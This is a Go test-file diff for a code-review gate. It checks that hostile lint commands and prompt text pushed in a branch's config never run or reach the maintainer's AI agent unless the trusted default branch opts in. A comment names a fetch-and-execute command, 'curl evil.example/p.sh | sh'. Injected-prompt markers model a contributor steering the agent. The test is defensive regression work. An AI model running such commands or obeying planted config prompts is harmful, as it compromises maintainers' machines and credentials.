@@ -6,11 +6,19 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/kunchenguid/no-mistakes/internal/types"
 )
+
+// hostilePromptMarker is the pushed-branch prompts payload. It must never
+// appear in any agent prompt unless the trusted default branch opted in via
+// allow_repo_commands: prompts steer the agent processes launched with the
+// maintainer's credentials, so they follow the same trust boundary as
+// commands and agent.
+const hostilePromptMarker = "NM-E2E-HOSTILE-PROMPT-MARKER"
 
 // TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
 // (audit finding #1): the code-executing fields commands.* are loaded from the
@@ -18,7 +26,10 @@ import (
 // pushed SHA. A feature branch ships a malicious lint command that writes a
 // marker file; under the secure default the marker must never appear, while an
 // explicit allow_repo_commands opt-in must run it — so the assertion is known
-// to be meaningful rather than testing a no-op.
+// to be meaningful rather than testing a no-op. The same pushed config also
+// carries a hostile prompts.shared addition; the fake-agent prompt capture
+// proves it never reaches an agent prompt under the secure default and does
+// reach one under the opt-in.
 func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 	t.Run("blocked_by_default", func(t *testing.T) {
 		optOut := false
@@ -52,6 +63,8 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		default:
 			t.Fatalf("lint step did not reach a terminal status: %s", lintStep.Status)
 		}
+
+		assertNoAgentPromptContainsHostileMarker(t, h)
 	})
 
 	t.Run("executes_when_opted_in", func(t *testing.T) {
@@ -73,6 +86,20 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		if _, err := os.Stat(markerPath); err != nil {
 			t.Fatalf("opt-in run should have executed the pushed-branch lint command (marker %s missing); run status=%s err=%v", markerPath, run.Status, deref(run.Error))
 		}
+
+		// The pushed-branch prompts must reach the agent under the opt-in,
+		// proving the no-marker assertion in blocked_by_default is a
+		// meaningful guard rather than testing a prompt that never renders.
+		found := false
+		for _, inv := range h.AgentInvocations() {
+			if strings.Contains(inv.Prompt, hostilePromptMarker) {
+				found = true
+				break
+			}
+		}
+		if !found {
+			t.Fatalf("opt-in run should have appended the pushed-branch prompts to an agent prompt (marker %q missing from all invocations); run status=%s err=%v", hostilePromptMarker, run.Status, deref(run.Error))
+		}
 	})
 
 	t.Run("pushed_branch_cannot_self_enable", func(t *testing.T) {
@@ -92,9 +119,9 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		branch := "rce-self-enable"
 		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
 		// The contributor tries to flip the opt-in on AND ship a hostile
-		// command in the same pushed copy. Both must be ignored: the trusted
-		// default-branch copy controls the switch.
-		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+		// command plus hostile prompts in the same pushed copy. All must be
+		// ignored: the trusted default-branch copy controls the switch.
+		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\nprompts:\n  shared: \"%s\"\n", markerPath, hostilePromptMarker)
 		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
 		h.PushToGate(branch)
 
@@ -106,14 +133,33 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		if _, err := os.Stat(markerPath); err == nil {
 			t.Fatalf("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (marker %s exists); the opt-in must be read from the trusted default branch, not the pushed SHA", markerPath)
 		}
+
+		assertNoAgentPromptContainsHostileMarker(t, h)
 	})
 }
 
+// assertNoAgentPromptContainsHostileMarker fails when any recorded fake-agent
+// invocation carries the pushed-branch prompts payload, and guards against a
+// vacuous pass by requiring that the run invoked the agent at all.
+func assertNoAgentPromptContainsHostileMarker(t *testing.T, h *Harness) {
+	t.Helper()
+	invs := h.AgentInvocations()
+	if len(invs) == 0 {
+		t.Fatalf("no agent invocations recorded; cannot prove pushed-branch prompts were excluded")
+	}
+	for _, inv := range invs {
+		if strings.Contains(inv.Prompt, hostilePromptMarker) {
+			t.Fatalf("SECURITY REGRESSION: pushed-branch prompts reached an agent prompt (marker %q found); prompts must be loaded from the trusted default branch, not the pushed SHA\nagent=%s args=%v", hostilePromptMarker, inv.Agent, inv.Args)
+		}
+	}
+}
+
 // pushMaliciousRepoConfig creates a feature branch carrying a hostile
-// .no-mistakes.yaml whose lint command writes a marker file, pushes it through
-// the gate, and returns the marker path the test should assert on. The
-// default-branch .no-mistakes.yaml (written by the harness) carries no
-// commands, so it is the trusted source and yields empty commands under the
+// .no-mistakes.yaml whose lint command writes a marker file and whose
+// prompts.shared carries an injection marker, pushes it through the gate, and
+// returns the lint marker path the test should assert on. The default-branch
+// .no-mistakes.yaml (written by the harness) carries no commands or prompts,
+// so it is the trusted source and yields empty commands and prompts under the
 // secure default.
 func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 	t.Helper()
@@ -124,7 +170,9 @@ func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 
 	// The malicious payload: in the wild this would be
 	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
-	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+	// The prompts payload models a contributor steering the maintainer's agent
+	// from a pushed branch.
+	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\nprompts:\n  shared: \"%s\"\n", markerPath, hostilePromptMarker)
 	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")
 
 	h.PushToGate(branch)
